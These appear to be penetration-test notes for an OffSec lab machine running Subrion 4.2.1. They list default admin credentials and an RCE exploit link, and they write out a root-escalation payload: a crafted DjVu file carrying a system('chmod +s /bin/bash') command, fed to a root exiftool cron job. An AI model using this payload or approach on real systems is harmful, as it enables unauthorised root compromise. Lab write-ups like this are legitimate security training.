### ++ Approach 192.168.239.163 ++
#### Credentials
	* admin:admin (Subrion Panel)

#### Services
	##### 22 SSH
		OpenSSH 8.2p1

	##### 80 Http
		exfiltrated.offsec
        Subrion 4.2.1
        Login panel: http://exfiltrated.offsec/panel/ (admin:admin)

### ++ Vulnerabilities ++

#### Vuln 1: RCE in Subrion 4.2.1 ++
	* Exploit: https://www.exploit-db.com/exploits/49876
    * It fails if we don't use the url correctly (ending in backslash '/')

### ++ System Interaction ++
#### Foothold  
	* Abusing vuln 1

#### Privilege Escalation 
	* The root user is executing the following script:
```bash
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE    
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```
    * We tried to abuse /etc/sudoers with GTFObins command, but we couldn't create a file called '../../../../../../tmp/sudoersjpg -filename=/etc/sudoers' to abuse this functionality, so we found **[this exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/?source=post_page-----229b20b1fd04--------------------------------)**

    (In our attack machine)
        vim exploit 
            (metadata "\c${system('chmod +s /bin/bash')};")
        bzz exploit exploit.bzz 
        djvumake exploit-jpg.djvu INFO='1,1' BGjp=/dev/null ANTz=exploit.bzz

    Now move exploit-jpg.djvu to /var/www/html/subrion/uploads and after the script is executed we should have a SUID /bin/bash